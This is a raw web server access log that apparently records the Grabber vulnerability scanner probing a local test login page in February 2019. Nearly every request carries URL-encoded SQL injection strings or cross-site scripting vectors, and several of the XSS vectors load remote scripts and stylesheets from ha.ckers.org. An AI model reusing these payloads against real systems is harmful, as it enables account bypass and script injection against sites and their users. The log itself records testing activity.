172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?Login=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?password=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE&user_token=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE&Login=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE&password=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27GRABBER_SQL_INJECTION&user_token=1%27GRABBER_SQL_INJECTION&Login=1%27GRABBER_SQL_INJECTION&password=1%27GRABBER_SQL_INJECTION& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27&user_token=1%27+OR+1+OR+1%3D%27&Login=1%27+OR+1+OR+1%3D%27&password=1%27+OR+1+OR+1%3D%27& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=OR+1%3D1&user_token=OR+1%3D1&Login=OR+1%3D1&password=OR+1%3D1& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%22OR+%221%22%3D%221&user_token=%22OR+%221%22%3D%221&Login=%22OR+%221%22%3D%221&password=%22OR+%221%22%3D%221& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%27%3B--&user_token=%27%3B--&Login=%27%3B--&password=%27%3B--& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--&user_token=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--&Login=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--&password=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27&user_token=1%27+OR+1+OR+1%3D%27&Login=1%27+OR+1+OR+1%3D%27&password=1%27+OR+1+OR+1%3D%27& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
